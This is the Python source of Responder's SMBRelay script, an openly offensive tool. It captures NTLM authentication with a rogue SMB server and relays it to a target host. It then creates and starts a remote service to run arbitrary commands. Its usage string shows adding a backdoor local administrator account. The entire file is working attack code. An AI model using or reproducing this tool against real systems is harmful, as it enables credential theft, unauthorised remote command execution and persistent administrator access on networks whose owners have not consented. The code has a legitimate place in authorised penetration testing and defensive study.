#!/usr/bin/env python
# This file is part of Responder, a network take-over set of tools 
# created and maintained by Laurent Gaffie.
# email: laurent.gaffie@gmail.com
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
import sys
import random
import optparse
import thread
sys.path.append('../')
from fingerprint import RunSmbFinger
from socket import *
from RelayPackets import *
from packets import *
from servers.SMB import *
from packets import Packet

import logging
Logs = logging
Logs.basicConfig(filemode="w",filename='SMBRelay-Session.txt',format='',level=logging.DEBUG)


def longueur(payload):
	return struct.pack(">i", len(''.join(payload)))


def UserCallBack(op, value, dmy, parser):
    args=[]
    for arg in parser.rargs:
        if arg[0] != "-":
            args.append(arg)
    if getattr(parser.values, op.dest):
        args.extend(getattr(parser.values, op.dest))
    setattr(parser.values, op.dest, args)

parser = optparse.OptionParser(usage="python %prog -i 10.20.30.40 -c 'net user Responder Quol0eeP/e}X /add &&net localgroup administrators Responder /add' -t 10.20.30.45 -u Administrator lgandx admin", prog=sys.argv[0],)
parser.add_option('-i','--ip', action="store", help="The ip address to redirect the traffic to. (usually yours)", metavar="10.20.30.40",dest="Responder_IP")
parser.add_option('-c',action='store', help='Command to run on the target.',metavar='"net user Responder Quol0eeP/e}X /ADD"',dest='CMD')
parser.add_option('-t',action="store", help="Target server for SMB relay.",metavar="10.20.30.45",dest="TARGET")
parser.add_option('-d',action="store", help="Target Domain for SMB relay (optional). This can be set to overwrite a domain logon (DOMAIN\Username) with the gathered credentials. Woks on NTLMv1",metavar="WORKGROUP",dest="Domain")
parser.add_option('-u', '--UserToRelay', action="callback", callback=UserCallBack, dest="UserToRelay")

options, args = parser.parse_args()

if options.CMD is None:
    print "\n-c mandatory option is missing, please provide a command to execute on the target.\n"
    parser.print_help()
    exit(-1)
elif options.TARGET is None:
    print "\n-t mandatory option is missing, please provide a target.\n"
    parser.print_help()
    exit(-1)
elif options.UserToRelay is None:
    print "\n-u mandatory option is missing, please provide a username to relay.\n"
    parser.print_help()
    exit(-1)

ResponderPATH = os.path.dirname(__file__)
UserToRelay = options.UserToRelay
Domain  = options.Domain
Command  = options.CMD
Target = options.TARGET
Responder_IP = options.Responder_IP

print "\nResponder SMBRelay 0.1\nPlease send bugs/comments to: laurent.gaffie@gmail.com"
print '\033[31m'+'Use this script in combination with Responder.py for best results (remember to set SMB = Off in Responder.conf)..\nUsernames  to relay (-u) are case sensitive.'+'\033[0m'
print 'To kill this script hit CRTL-C or Enter\nWill relay credentials for these users: '+'\033[1m\033[34m'+', '.join(UserToRelay)+'\033[0m\n'

#Function used to verify if a previous auth attempt was made.
def ReadData(outfile,Client, User, cmd=None):
    try:
        with open(ResponderPATH+outfile,"r") as filestr:
            if cmd is None:
                String = Client+':'+User
                if re.search(String.encode('hex'), filestr.read().encode('hex')):
                    return True
                return False
            if cmd is not None:
                String = Client+","+User+","+cmd
                if re.search(String.encode('hex'), filestr.read().encode('hex')):
                    print "[+] Command: %s was previously executed on host: %s. Won't execute again.\n" %(cmd, Client)
                    return True
                return False
    except:
        raise

#Function used to parse SMB NTLMv1/v2
def ParseHash(data,Client, Target):
    try:
        lenght = struct.unpack('<H',data[43:45])[0]
        LMhashLen = struct.unpack('<H',data[51:53])[0]
        NthashLen = struct.unpack('<H',data[53:55])[0]
        Bcc = struct.unpack('<H',data[63:65])[0]
        if NthashLen >= 30:
            Hash = data[65+LMhashLen:65+LMhashLen+NthashLen]
            pack = tuple(data[89+NthashLen:].split('\x00\x00\x00'))[:2]
            var = [e.replace('\x00','') for e in data[89+NthashLen:Bcc+60].split('\x00\x00\x00')[:2]]
            Username, Domain = tuple(var)
            if ReadData("SMBRelay-Session.txt", Client, Username):
                print "[+]Auth from user %s with host %s previously failed. Won't relay."%(Username, Client)
            if Username in UserToRelay:
                print '%s sent a NTLMv2 Response..\nVictim OS is : %s. Passing credentials to: %s'%(Client,RunSmbFinger((Client, 445)),Target)
                print "Username : ",Username
                print "Domain (if joined, if not then computer name) : ",Domain
                return data[65:65+LMhashLen],data[65+LMhashLen:65+LMhashLen+NthashLen],Username,Domain, Client
        if NthashLen == 24:
            pack = tuple(data[89+NthashLen:].split('\x00\x00\x00'))[:2]
            var = [e.replace('\x00','') for e in data[89+NthashLen:Bcc+60].split('\x00\x00\x00')[:2]]
            Username, Domain = tuple(var)
            if ReadData("SMBRelay-Session.txt", Client, Username):
                print "Auth from user %s with host %s previously failed. Won't relay."%(Username, Client)
            if Username in UserToRelay:
                print '%s sent a NTLMv1 Response..\nVictim OS is : %s. Passing credentials to: %s'%(Client,RunSmbFinger((Client, 445)),Target)
                LMHashing = data[65:65+LMhashLen].encode('hex').upper()
                NTHashing = data[65+LMhashLen:65+LMhashLen+NthashLen].encode('hex').upper()
                print "Username : ",Username
                print "Domain (if joined, if not then computer name) : ",Domain
                return data[65:65+LMhashLen],data[65+LMhashLen:65+LMhashLen+NthashLen],Username,Domain, Client
            else:
                print "'%s' user was not specified in -u option, won't relay authentication. Allowed users to relay are: %s"%(Username,UserToRelay)
    except Exception:
        raise

#Detect if SMB auth was Anonymous
def Is_Anonymous(data):
    LMhashLen = struct.unpack('<H',data[51:53])[0]
    if LMhashLen == 0 or LMhashLen == 1:
        print "SMB Anonymous login requested, trying to force client to auth with credz."
        return True
    return False

def ParseDomain(data):
    return ''.join(data[81:].split('\x00\x00\x00')[:1])+'\x00\x00\x00'

#Function used to know which dialect number to return for NT LM 0.12
def Parse_Nego_Dialect(data):
    DialectStart = data[40:]
    pack = tuple(DialectStart.split('\x02'))[:10]
    var = [e.replace('\x00','') for e in DialectStart.split('\x02')[:10]]
    test = tuple(var)
    if test[0] == "NT LM 0.12":
        return "\x00\x00"
    if test[1] == "NT LM 0.12":
        return "\x01\x00"
    if test[2] == "NT LM 0.12":
        return "\x02\x00"
    if test[3] == "NT LM 0.12":
        return "\x03\x00"
    if test[4] == "NT LM 0.12":
        return "\x04\x00"
    if test[5] == "NT LM 0.12":
        return "\x05\x00"
    if test[6] == "NT LM 0.12":
        return "\x06\x00"
    if test[7] == "NT LM 0.12":
        return "\x07\x00"
    if test[8] == "NT LM 0.12":
        return "\x08\x00"
    if test[9] == "NT LM 0.12":
        return "\x09\x00"
    if test[10] == "NT LM 0.12":
        return "\x0a\x00"

def SmbRogueSrv139(key,Target,DomainMachineName):
    s = socket.socket(AF_INET,SOCK_STREAM)
    s.setsockopt(SOL_SOCKET,SO_REUSEADDR, 1)
    s.settimeout(30)
    try:
        s.bind(('0.0.0.0', 139))
        s.listen(0)
        conn, addr = s.accept()
    except error, msg:
        if "Address already in use" in msg:
            print '\033[31m'+'Something is already listening on TCP 139, did you set SMB = Off in Responder.conf..?\nSMB Relay will not work.'+'\033[0m'

    try:
        while True:
            data = conn.recv(1024)
            ##session request 139
            if data[0] == "\x81":
                buffer0 = "\x82\x00\x00\x00"
                conn.send(buffer0)
            ##Negotiate proto answer.
            if data[8:10] == "\x72\x00":
                head = SMBHeader(cmd="\x72",flag1="\x98", flag2="\x53\xc8",pid=pidcalc(data),tid=tidcalc(data))
                t = SMBNegoAns(Dialect=Parse_Nego_Dialect(data),Key=key,Domain=DomainMachineName)
                t.calculate()
                packet1 = str(head)+str(t)
                buffer1 = longueur(packet1)+packet1
                conn.send(buffer1)
                ##Session Setup AndX Request
            if data[8:10] == "\x73\x00":
                if Is_Anonymous(data):
                    head = SMBHeader(cmd="\x73",flag1="\x90", flag2="\x03\xc8",errorcode="\x6d\x00\x00\xc0",pid=pidcalc(data),tid=tidcalc(data),uid=uidcalc(data),mid=midcalc(data))
                    packet1 = str(head)+str(SMBSessEmpty())
                    buffer1 = longueur(packet1)+packet1
                    conn.send(buffer1)
                else:
                    head = SMBHeader(cmd="\x73",flag1="\x90", flag2="\x03\xc8",errorcode="\x6d\x00\x00\xC0",pid=pidcalc(data),tid=tidcalc(data),uid=uidcalc(data),mid=midcalc(data))
                    packet1 = str(head)+str(SMBSessEmpty())#Return login fail anyways.
                    buffer1 = longueur(packet1)+packet1
                    conn.send(buffer1)
                    Credz = ParseHash(data,addr[0],Target)
                    return Credz
    except:
        return None

def RunRelay(host, Command,Domain):
    Target = host
    CMD = Command
    print "Target is running: ", RunSmbFinger((host, 445))
    s = socket.socket(AF_INET, SOCK_STREAM)
    s.connect((host, 445))
    h = SMBHeader(cmd="\x72",flag1="\x18",flag2="\x03\xc7",pid="\xff\xfe", tid="\xff\xff")
    n = SMBNego(Data = SMBNegoData())
    n.calculate()
    packet0 = str(h)+str(n)
    buffer0 = longueur(packet0)+packet0
    s.send(buffer0)
    data = s.recv(2048)
    Key = ParseAnswerKey(data,host)
    DomainMachineName = ParseDomain(data)
    if data[8:10] == "\x72\x00":
        try:
            a = SmbRogueSrv139(Key,Target,DomainMachineName)
            if a is not None:
                LMHash,NTHash,Username,OriginalDomain, CLIENTIP = a
                if Domain is None:
                    Domain = OriginalDomain
                if ReadData("SMBRelay-Session.txt", Target, Username, CMD):
                    pass
                else:
                    head = SMBHeader(cmd="\x73",flag1="\x18", flag2="\x03\xc8",pid="\xff\xfe",mid="\x01\x00")
                    t = SMBSessionTreeData(AnsiPasswd=LMHash,UnicodePasswd=NTHash,Username=Username,Domain=Domain,Targ=Target)
                    t.calculate()
                    packet0 = str(head)+str(t)
                    buffer1 = longueur(packet0)+packet0
                    s.send(buffer1)
                    data = s.recv(2048)
        except:
            raise
            a = None
    if data[8:10] == "\x73\x6d":
        print "[+] Relay failed, auth denied. This user doesn't have an account on this target."
        Logs.info(CLIENTIP+":"+Username)
    if data[8:10] == "\x73\x0d":
        print "[+] Relay failed, SessionSetupAndX returned invalid parameter. It's most likely because both client and server are >=Windows Vista"
        Logs.info(CLIENTIP+":"+Username)
        ## NtCreateAndx
    if data[8:10] == "\x73\x00":
        print "[+] Authenticated, trying to PSexec on target !"
        head = SMBHeader(cmd="\xa2",flag1="\x18", flag2="\x02\x28",mid="\x03\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
        t = SMBNTCreateData()
        t.calculate()
        packet0 = str(head)+str(t)
        buffer1 = longueur(packet0)+packet0
        s.send(buffer1)
        data = s.recv(2048)
        ## Fail Handling.
    if data[8:10] == "\xa2\x22":
        print "[+] Exploit failed, NT_CREATE denied. SMB Signing mandatory or this user has no privileges on this workstation?"
        ## DCE/RPC Write.
    if data[8:10] == "\xa2\x00":
        head = SMBHeader(cmd="\x2f",flag1="\x18", flag2="\x05\x28",mid="\x04\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
        x = SMBDCEData()
        x.calculate()
        f = data[42:44]
        t = SMBWriteData(FID=f,Data=x)
        t.calculate()
        packet0 = str(head)+str(t)
        buffer1 = longueur(packet0)+packet0
        s.send(buffer1)
        data = s.recv(2048)
        ## DCE/RPC Read.
        if data[8:10] == "\x2f\x00":
            head = SMBHeader(cmd="\x2e",flag1="\x18", flag2="\x05\x28",mid="\x05\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
            t = SMBReadData(FID=f)
            t.calculate()
            packet0 = str(head)+str(t)
            buffer1 = longueur(packet0)+packet0
            s.send(buffer1)
            data = s.recv(2048)
            ## DCE/RPC SVCCTLOpenManagerW.
            if data[8:10] == "\x2e\x00":
                head = SMBHeader(cmd="\x2f",flag1="\x18", flag2="\x05\x28",mid="\x06\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
                w = SMBDCESVCCTLOpenManagerW(MachineNameRefID="\x00\x00\x03\x00")
                w.calculate()
                x = SMBDCEPacketData(Data=w)
                x.calculate()
                t = SMBWriteData(FID=f,Data=x)
                t.calculate()
                packet0 = str(head)+str(t)
                buffer1 = longueur(packet0)+packet0
                s.send(buffer1)
                data = s.recv(2048)
                ## DCE/RPC Read Answer.
                if data[8:10] == "\x2f\x00":
                    head = SMBHeader(cmd="\x2e",flag1="\x18", flag2="\x05\x28",mid="\x07\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
                    t = SMBReadData(FID=f)
                    t.calculate()
                    packet0 = str(head)+str(t)
                    buffer1 = longueur(packet0)+packet0
                    s.send(buffer1)
                    data = s.recv(2048)
                    ## DCE/RPC SVCCTLCreateService.
                    if data[8:10] == "\x2e\x00":
                        if data[len(data)-4:] == "\x05\x00\x00\x00":
                            print "[+] Failed to open SVCCTL Service Manager, is that user a local admin on this host?"
                        print "[+] Creating service"
                        head = SMBHeader(cmd="\x2f",flag1="\x18", flag2="\x05\x28",mid="\x08\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
                        ContextHandler = data[88:108]
                        ServiceNameChars = ''.join([random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ') for i in range(11)])
                        ServiceIDChars = ''.join([random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ') for i in range(16)])
                        FileChars = ''.join([random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ') for i in range(6)])+'.bat'
                        w = SMBDCESVCCTLCreateService(ContextHandle=ContextHandler,ServiceName=ServiceNameChars,DisplayNameID=ServiceIDChars,ReferentID="\x21\x03\x03\x00",BinCMD=CMD)
                        w.calculate()
                        x = SMBDCEPacketData(Opnum="\x0c\x00",Data=w)
                        x.calculate()
                        t = SMBWriteData(Offset="\x9f\x01\x00\x00",FID=f,Data=x)
                        t.calculate()
                        packet0 = str(head)+str(t)
                        buffer1 = longueur(packet0)+packet0
                        s.send(buffer1)
                        data = s.recv(2048)
                        ## DCE/RPC Read Answer.
                        if data[8:10] == "\x2f\x00":
                            head = SMBHeader(cmd="\x2e",flag1="\x18", flag2="\x05\x28",mid="\x09\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
                            t = SMBReadData(FID=f,MaxCountLow="\x40\x02", MinCount="\x40\x02",Offset="\x82\x02\x00\x00")
                            t.calculate()
                            packet0 = str(head)+str(t)
                            buffer1 = longueur(packet0)+packet0
                            s.send(buffer1)
                            data = s.recv(2048)
                            ## DCE/RPC SVCCTLOpenService.
                            if data[8:10] == "\x2e\x00":
                                if data[len(data)-4:] == "\x05\x00\x00\x00":
                                    print "[+] Failed to create the service"

                                head = SMBHeader(cmd="\x2f",flag1="\x18", flag2="\x05\x28",mid="\x0a\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
                                w = SMBDCESVCCTLOpenService(ContextHandle=ContextHandler,ServiceName=ServiceNameChars)
                                w.calculate()
                                x = SMBDCEPacketData(Opnum="\x10\x00",Data=w)
                                x.calculate()
                                t = SMBWriteData(Offset="\x9f\x01\x00\x00",FID=f,Data=x)
                                t.calculate()
                                packet0 = str(head)+str(t)
                                buffer1 = longueur(packet0)+packet0
                                s.send(buffer1)
                                data = s.recv(2048)
                                ## DCE/RPC Read Answer.
                                if data[8:10] == "\x2f\x00":
                                    head = SMBHeader(cmd="\x2e",flag1="\x18", flag2="\x05\x28",mid="\x0b\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
                                    t = SMBReadData(FID=f,MaxCountLow="\x40\x02", MinCount="\x40\x02",Offset="\x82\x02\x00\x00")
                                    t.calculate()
                                    packet0 = str(head)+str(t)
                                    buffer1 = longueur(packet0)+packet0
                                    s.send(buffer1)
                                    data = s.recv(2048)
                                    ## DCE/RPC SVCCTLStartService.
                                    if data[8:10] == "\x2e\x00":
                                        if data[len(data)-4:] == "\x05\x00\x00\x00":
                                            print "[+] Failed to open the service"
                                        ContextHandler = data[88:108]
                                        head = SMBHeader(cmd="\x2f",flag1="\x18", flag2="\x05\x28",mid="\x0a\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
                                        w = SMBDCESVCCTLStartService(ContextHandle=ContextHandler)
                                        x = SMBDCEPacketData(Opnum="\x13\x00",Data=w)
                                        x.calculate()
                                        t = SMBWriteData(Offset="\x9f\x01\x00\x00",FID=f,Data=x)
                                        t.calculate()
                                        packet0 = str(head)+str(t)
                                        buffer1 = longueur(packet0)+packet0
                                        s.send(buffer1)
                                        data = s.recv(2048)
                                        ## DCE/RPC Read Answer.
                                        if data[8:10] == "\x2f\x00":
                                            head = SMBHeader(cmd="\x2e",flag1="\x18", flag2="\x05\x28",mid="\x0b\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
                                            t = SMBReadData(FID=f,MaxCountLow="\x40\x02", MinCount="\x40\x02",Offset="\x82\x02\x00\x00")
                                            t.calculate()
                                            packet0 = str(head)+str(t)
                                            buffer1 = longueur(packet0)+packet0
                                            s.send(buffer1)
                                            data = s.recv(2048)
                                            if data[8:10] == "\x2e\x00":
                                                print "[+] Command successful !"
                                                Logs.info('Command successful:')
                                                Logs.info(Target+","+Username+','+CMD)
                                                return True
                                            if data[8:10] != "\x2e\x00":
                                                return False


def RunInloop(Target,Command,Domain):
    try:
        while True:
            worker = RunRelay(Target,Command,Domain)
    except:
        raise


def main():
    try:
        thread.start_new(RunInloop,(Target,Command,Domain))
    except KeyboardInterrupt:
        exit()

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        raise
    raw_input()
